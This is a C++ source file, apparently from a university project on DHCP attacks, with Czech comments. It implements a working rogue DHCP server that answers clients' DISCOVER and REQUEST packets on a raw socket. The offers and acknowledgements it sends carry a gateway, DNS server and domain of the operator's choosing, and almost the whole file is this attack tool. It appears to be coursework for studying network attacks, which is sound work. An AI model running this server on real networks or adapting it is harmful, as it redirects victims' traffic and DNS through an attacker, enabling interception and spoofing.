/**
 * Projekt: PDS - DHCP attacks
 *
 * @file dhcprogue.cpp
 *
 * @author David Koleckar - xkolec07
 *
 * @brief Rogue DHCP Server - provozujici falesny DHCP server poskytujici 
 * klientum vlastni zakladni sitove parametry
 */

#include "dhcprogue.h"

void help(){
	std::cout << "PDS - Rogue DHCP Server" << std::endl;
	std::cout << "Pouziti:" << std::endl;
	std::cout << "./pds-dhcprogue -i interface -p pool -g gateway -n dns-server -d domain -l lease-time" << std::endl;
	std::cout << "-interface (retezec) jmeno rozhrani" << std::endl;
	std::cout << "-pool adres (retezec - 192.168.1.100-192.168.1.199)" << std::endl;
	std::cout << "-gateway (IPv4 adresa)" << std::endl;
	std::cout << "-dns-server (IPv4 adresa)" << std::endl;
	std::cout << "-domain (retezec) jmeno domeny" << std::endl;
	std::cout << "-lease-time (cislo) doba vypujcky v sekundach" << std::endl;
}

void signalHandler(int signo){
	if (signo == SIGINT){
		exit(EXIT_SUCCESS);
	}
}

int addressPoolSize(std::string input){
	//rozdeleni adres
	std::size_t found = input.find_first_of("-");
	std::string adr1 = input.substr(0,found);
	std::string adr2 = input.substr(found+1);
	//vypocitani poctu adress
	found = adr2.find_last_of(".");
	std::size_t found2 = adr1.find_last_of(".");
	int result = std::stoi(adr2.substr(found+1)) - std::stoi(adr1.substr(found2+1));

	return result;
}

std::string addresPool(std::string input){
	//rozdeleni adres
	std::size_t found = input.find_first_of("-");
	std::string adr1 = input.substr(0,found);

	return adr1.c_str();
}

std::string addresPool2(std::string input){
	//rozdeleni adres
	std::size_t found = input.find_first_of("-");
	std::string adr1 = input.substr(0,found);
	std::string adr2 = input.substr(found+1);

	return adr2.c_str();
}

std::string incrementAddress(std::string input){
	in_addr_t address = inet_addr(input.c_str());
	//prevod adresy a nasledna inkrementace
    address = ntohl(address);
    address += 1;
    address = htonl(address);

    struct in_addr address_struct;
    address_struct.s_addr = address;

    return std::string(inet_ntoa(address_struct));
}

bool checkNAK(const char *requestedIP,const char *lastIP, const char *adr2){
	in_addr_t reqIP = inet_addr(requestedIP);
	reqIP = ntohl(reqIP);

	in_addr_t minIP = inet_addr(lastIP);
	minIP = ntohl(minIP)-1;

	in_addr_t maxIP = inet_addr(adr2);
	maxIP = ntohl(maxIP);
	//kontrola zda je v danem rozsahu
	if(reqIP >= minIP && reqIP <=maxIP)
		return false;
	else 
		return true;

}

void runServer(std::string iface, std::string domain, std::string pool, int lease, std::string dns, std::string gateway){

	//vytvoreni socketu
	int socket = createSocket();
	//bind
	bindSocket(socket,iface.c_str());

	//prvni adresa z poolu + max pocet IP adres
	std::string offerIP = addresPool(pool);
	int maxIP = addressPoolSize(pool)+1;
	//adresa serveru
	unsigned int myIP =  *(unsigned int*) getInterfaceIP(socket,iface.c_str());
	//prevod adresy routeru
	unsigned int router = inet_addr(gateway.c_str());
	//prevod adresy dns
	unsigned int d = inet_addr(dns.c_str());

	//prijate data
	int recvDataLen;
	unsigned char recvPacket[PACKET_HLEN];
	struct iphdr *recvIp = (struct iphdr *)(recvPacket + ETH_HLEN);
	struct udphdr *recvUdp;
	struct dhcphdr *recvDhcp;
	unsigned char *recvOptions;	

	//odesilane data
	unsigned char sendPacket[PACKET_HLEN];
	unsigned char *sendOptions; 
	struct dhcphdr *sendDhcp;
	struct udphdr *sendUdp;
	struct iphdr *sendIp;
	struct ethhdr *sendEth;

	//spustit server
	while(1){
		
		//prijmuti prichozich dat
		if ((recvDataLen = recv(socket, recvPacket, PACKET_HLEN, 0)) == -1){
			printEcode(ERECV);
			exit(EXIT_FAILURE);		
		}

		//ihl je pulbyte -> *4
		recvUdp = (struct udphdr *)(recvPacket + ETH_HLEN + recvIp->ihl*4);
		recvDhcp = (struct dhcphdr *)(recvPacket + UDP_HLEN + ETH_HLEN + recvIp->ihl*4 );
		recvOptions = (unsigned char *)(recvPacket + ETH_HLEN + UDP_HLEN + DHCP_HLEN + recvIp->ihl*4);
		//pokud je to discover zprava
		if(ntohs(recvUdp->source) == 68 && recvOptions[2] == 0x01 && recvOptions[0] == 0x35 && maxIP!=0){
			//prevod aktualne nabizene adresy
			unsigned int actualIP = inet_addr(offerIP.c_str());
			//velikost offer options
			int offerOptionLen = strlen(domain.c_str())+1+OFF_HLEN;
			//vytvoreni hlavicek
			sendOptions = createOffer(myIP,router, lease, domain.c_str(), d);
			sendDhcp = createDHCP(recvDhcp->chaddr, ntohl(recvDhcp->xid), 2, myIP, actualIP);
			sendUdp = createUDP(DHCP_HLEN+offerOptionLen,67,68);	
			sendIp = createIP(UDP_HLEN+offerOptionLen+DHCP_HLEN, myIP, actualIP);
			sendEth = createEther(getInterfaceHwAdrr(socket,iface.c_str()),recvDhcp->chaddr);

			//tvorba packetu
			memcpy(sendPacket, sendEth, ETH_HLEN);
			memcpy(sendPacket + ETH_HLEN, sendIp, IP_HLEN);
			memcpy(sendPacket + ETH_HLEN + IP_HLEN, sendUdp, UDP_HLEN);
			memcpy(sendPacket + ETH_HLEN + IP_HLEN + UDP_HLEN, sendDhcp, DHCP_HLEN);
			memcpy(sendPacket + ETH_HLEN + IP_HLEN + UDP_HLEN + DHCP_HLEN, sendOptions, offerOptionLen);

			//poslani packetu
			if(send(socket, sendPacket, 284+offerOptionLen, 0) == -1){
				printEcode(ESEND);
				exit(EXIT_FAILURE);
			}
			//inkrementace adresy
			offerIP = incrementAddress(offerIP);
			maxIP--;
			continue;
		}
		//pokud je to request
		if(ntohs(recvUdp->source) == 68 && recvOptions[2] == 0x03 && recvOptions[0] == 0x35){
			//ziskani adresy z dhcp options request
			unsigned char reqIP[4];
			unsigned int optionsLen = recvDataLen - (ETH_HLEN + recvIp->ihl*4 + UDP_HLEN + DHCP_HLEN);

			for(unsigned int i = 0; i<optionsLen; i++){
				if(recvOptions[i] == 0x32){
					memcpy(reqIP, &recvOptions[i+2], 4);
					break;
				}
			}
			unsigned int requestIP = *(unsigned int*) reqIP;

			//prevod adresu do charu
			char tmp[20];
			sprintf(tmp,"%d.%d.%d.%d\n", reqIP[0], reqIP[1], reqIP[2], reqIP[3]); 
 
			//pokud je pozadovana adresa mimo rozsah odeslat NAK
			if(checkNAK( (const char*)tmp,offerIP.c_str(), addresPool2(pool).c_str())){
				//tvorba hlavicek
				sendOptions = createNak(myIP);
				sendDhcp = createDHCP(recvDhcp->chaddr, ntohl(recvDhcp->xid), 2, 0, 0);
				sendUdp = createUDP(DHCP_HLEN+NAK_HLEN,67,68);	
				sendIp = createIP(UDP_HLEN+NAK_HLEN+DHCP_HLEN, myIP, inet_addr("255.255.255.255"));
				sendEth = createEther(getInterfaceHwAdrr(socket,iface.c_str()),recvDhcp->chaddr);

				//tvorba packetu
				memcpy(sendPacket, sendEth, ETH_HLEN);
				memcpy(sendPacket + ETH_HLEN, sendIp, IP_HLEN);
				memcpy(sendPacket + ETH_HLEN + IP_HLEN, sendUdp, UDP_HLEN);
				memcpy(sendPacket + ETH_HLEN + IP_HLEN + UDP_HLEN, sendDhcp, DHCP_HLEN);
				memcpy(sendPacket + ETH_HLEN + IP_HLEN + UDP_HLEN + DHCP_HLEN, sendOptions, NAK_HLEN);

				//poslani packetu
				if(send(socket, sendPacket, 294, 0) == -1){
					printEcode(ESEND);
					exit(EXIT_FAILURE);
				}
			}
			else{
				//tvorba hlavicek
				int requestOptionLen = strlen(domain.c_str())+1+ACK_HLEN;
				sendOptions = createAck(myIP,router, lease, domain.c_str(), d);
				sendDhcp = createDHCP(recvDhcp->chaddr, ntohl(recvDhcp->xid), 2, myIP, requestIP);
				sendUdp = createUDP(DHCP_HLEN+requestOptionLen,67,68);	
				sendIp = createIP(UDP_HLEN+requestOptionLen+DHCP_HLEN, myIP, requestIP);
				sendEth = createEther(getInterfaceHwAdrr(socket,iface.c_str()),recvDhcp->chaddr);

				//tvorba packetu
				memcpy(sendPacket, sendEth, ETH_HLEN);
				memcpy(sendPacket + ETH_HLEN, sendIp, IP_HLEN);
				memcpy(sendPacket + ETH_HLEN + IP_HLEN, sendUdp, UDP_HLEN);
				memcpy(sendPacket + ETH_HLEN + IP_HLEN + UDP_HLEN, sendDhcp, DHCP_HLEN);
				memcpy(sendPacket + ETH_HLEN + IP_HLEN + UDP_HLEN + DHCP_HLEN, sendOptions,requestOptionLen);

				//poslani packetu
				if(send(socket, sendPacket, 284+requestOptionLen, 0) == -1){
					printEcode(ESEND);
					exit(EXIT_FAILURE);
				}
			}
		}
	}//end while
	free(sendOptions);
	close(socket);
}

int main (int argc, char *argv[])
{ 

	// odchytavani signalu SIGINT
	signal(SIGINT, signalHandler);
	//prepinace pro getopt
	int opt;
	//interface, pool, domain, lease
	std::string iface("");
	std::string pool("");
	std::string domain("");
	std::string gateway("");
	std::string dns("");
	int lease = 0;
	//pro kontrolu zda se jedna o IPv4
	struct sockaddr_in dtmp;
	struct sockaddr_in gtmp;

	//zpracovani parametru
	while ((opt = getopt (argc, argv, "i:p:g:n:d:l:h")) != -1)
	{
		switch (opt)
		{	
			//prepinac -i (interface)
			case 'i':
				iface = std::string(optarg);
			break;
			//prepinac -p (pool adresa)
			case 'p':
				pool = std::string(optarg);
			break;
			//prepinac -g (gateway)
			case 'g':
				if(inet_pton(AF_INET, optarg, &(gtmp.sin_addr)) != 1){
					printEcode(EARG);
					exit(EXIT_FAILURE);
				}
				else
					gateway = std::string(optarg);
			break;
			//prepinac -n (adresa dns serveru)
			case 'n':
				if(inet_pton(AF_INET, optarg, &(dtmp.sin_addr)) != 1){
					printEcode(EARG);
					exit(EXIT_FAILURE);
				}
				else
					dns = std::string(optarg);
			break;
			//prepinac -d (domain)
			case 'd':
				domain = std::string(optarg);
			break;
			//prepinac -l (lease-time)
			case 'l':
				if(std::string(optarg).find_first_not_of("0123456789") != std::string::npos){
					printEcode(EARG);
					exit(EXIT_FAILURE);
				}
				else
					lease = atoi(optarg);
			break;
			//prepinac -h (help)
			case 'h':
				help();
				exit(EXIT_SUCCESS);
			break;

			default:
			break;
		}
	}

	//pokud neni zadan interface nebo adresni pool nebo domain
	if (iface.empty() || pool.empty() || domain.empty()){
		printEcode(EARG);
		exit(EXIT_FAILURE);
	}
	//pokud lease neni cislo
	if(lease == -1){
		printEcode(EARG);
		exit(EXIT_FAILURE);
	}

	runServer(iface, domain, pool,lease , dns, gateway);

	return EXIT_SUCCESS;
} 
